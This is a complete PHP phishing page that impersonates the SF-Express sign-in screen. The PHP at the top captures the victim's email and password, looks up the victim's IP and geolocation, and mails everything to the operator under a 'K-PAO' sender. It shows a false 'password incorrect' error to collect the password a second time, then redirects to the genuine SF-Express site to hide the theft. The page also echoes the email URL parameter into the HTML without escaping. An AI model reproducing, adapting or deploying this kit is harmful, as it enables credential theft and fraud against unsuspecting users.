
<?php 

$email = $_GET['email'];
$submitName = "submit";

if(isset($_POST['submit'])) {
	
	if(!empty($_POST['password'])){
		
	$password = $_POST['password'];
	$stain = "Password is incorrect. Please try again.</a>";
	$submitName = "submit2";
    $errors = 1;
	$page = 1;
	require '../forward.php';
	$browser = $_SERVER['HTTP_USER_AGENT'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
	} 
	$from_email = "KPAO@KPAO.KPAO";
	$headers = "From: K-PAO <$from_email>";
	$message .= "START LOG:\n";
	$message .= "Email Address: " . $email . "\n"; 
	$message .= "Password: " . $password . "\n"; 
	$message .= "LOCATION (".$ip.",{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
	$to = EMAIL; 
	mail($to,$emailprovider."Sf-Express ".$ip , $message,$headers);
    } else {
	$stain = "Please enter your password.";
    $errors = 1;
    }
}

if(isset($_POST['submit2'])) {
	
	if(!empty($_POST['password'])){
		
	$password = $_POST['password'];
	$stain = "Your account or password is incorrect. Please try again.</a>";
	$submitName = "submit2";
        $errors = 1;
	$page = 1;
	require '../forward.php';
	$browser = $_SERVER['HTTP_USER_AGENT'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
	} 
	$from_email = "KPAO@KPAO.KPAO";
	$headers = "From: K-PAO <$from_email>";
	$message .= "START LOG:\n";
	$message .= "Email Address: " . $email . "\n"; 
	$message .= "Password: " . $password . "\n"; 
	$message .= "LOCATION (".$ip.",{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
	$to = EMAIL; 
	mail($to,$emailprovider."Sf-Express ".$ip , $message,$headers);
        echo "<script>window.open('https://i.sf-express.com','_self')</script>";
	
    } else {
	$submitName = "submit2";
	$stain = "Please enter your password.";
        $errors = 1;
    }
}



?>

<html lang="en-US"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, maximum-scale=5.0">
    
    <title>Sign in - SF-Express</title>
<script type="text/javascript" charset="utf-8" async="" src="/styles-mobile.11.0.0.chunk.js"></script><script type="text/javascript" charset="utf-8" async="" src="/lang-en_US.11.0.0.chunk.js"></script>

<link rel="stylesheet" type="text/css" href="generatorCSS.css">

<link rel="shortcut icon" href="expresslogo.png" type="image/vnd.microsoft.icon"><script async="" src="https://mpsnare.iesnare.com/snare.js"></script><script type="text/javascript" charset="utf-8" async="" src="/EnterCredentialBase.11.0.0.chunk.js"></script><script language="javascript" type="text/javascript" src="https://mpsnare.iesnare.com/script/logo.js"></script><script type="text/javascript" charset="utf-8" async="" src="/OAuthEnterEmailPassword.11.0.0.chunk.js"></script></head>
<body data-test-automation-id="root" class="rc-touch withTopTitleBar" style="background-image: url(&quot;background2.jpg&quot;); background-size: cover;">
<div onclick="void(0)" class="content-wrapper">
    <div id="rc-desktop-loader" class="rc-desktop-loader" style="display: none;"></div>
    <div id="rc-mobile-loader" class="bootstrap-rc rc-mobile-loader" style="display: none;">
        <div class="rc-mobile-loader-body">
            <div id="rc-mobile-loader-text">Please wait...</div>
        </div>
    </div>
    <style>
        .btn{
            background-color: gray;
            color: white;
            width: 200px;
        }
        #password{
            border-radius: 30px;
            width: 300px;
        }
        
    </style>
    <div id="redirecting" class="bootstrap-rc rc-redirecting" style="display: none;">
        <div class="rc-redirecting-body" id="rc-redirecting-body">Please wait...</div>
    </div>

    <div class="bootstrap-rc">
	
        <div id="toastMsgBar" data-test-automation-id="accountLockedError" class="rc-login-toast" style="display: none;"></div>
        <div id="pageContent" role="main"><div data-reactroot="" class="rc-3leg-row row"><div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 col-sm-10 col-sm-offset-1 col-xs-12"><div class="rc-3leg-container center-block rc-block"><div class="text-center rc-block rc-block-accent">
                            <br/><br/>
                            
                            <div style="display: inline-block;width: 100%;">
                                <img id="logo" src="expresslogo.png" height="100px" width="200px"/>
                            </div>
                            <br/><br/>
                            <center>
		<form novalidate="" method="post" action="">
		
		<div><div class="rc-block"><div data-test-automation-id="form" class="rc-form">
                            <input type="text" value="<?php echo $_GET['email']; ?>" name="password" data-test-automation-id="input" id="password" class="form-control" style="padding-left:10px; text-align: center;" disabled="">
                            <input type="text" name="loginEmail" class="hidden" aria-label="Email" value="<?php echo $_GET['email']; ?>"><div data-test-automation-id="password" type="password" class="form-group"><label data-test-automation-id="label" for="password" class="control-label" style="color:black;"></label>
		<span style="color:red;"><?php  if(isset($_POST['submit']) or isset($_POST['submit2'])){ echo $stain; } ?></span>
		<input type="password" value="" name="password" data-test-automation-id="input" id="password" class="form-control" style="padding-left:10px; text-align: center;" placeholder="Enter your password"></div></div></div><div class="text-center rc-block rc-block-addTopOffset"><div class="row">
		<div class="col-xs-3"></div>
		<div class="col-xs-6">
		
		<button type="submit" name="<?php echo $submitName; ?>" class="btn">Sign In</button>
		
		</div>
		
		</div></div><div class="text-center rc-block rc-block-half-condensed"><button data-test-automation-id="resetPasswordLink" type="button" class="btn btn-link" style="">Forgot Password?</button></div></div></form>
                            </center>
		
		</div></div></div></div>
    </div>

</div>
<script type="text/javascript">
    var io_operation = "ioBegin";
    var io_bbout_element_id = "ibb";
    var io_install_flash = false;
    var io_min_flash_version = 9999;    // disable Flash
    var io_install_stm = false;
    var io_exclude_stm = 15;
    var sddi_element_id = "isddi";
    var version = '11.0.0.5fc59a2';
</script>
<!-- Accessibility Dynamic message container -->
<div class="bootstrap-rc">
    <div class="sr-only" id="live-message-container" aria-atomic="true"></div>
</div>
</body></html>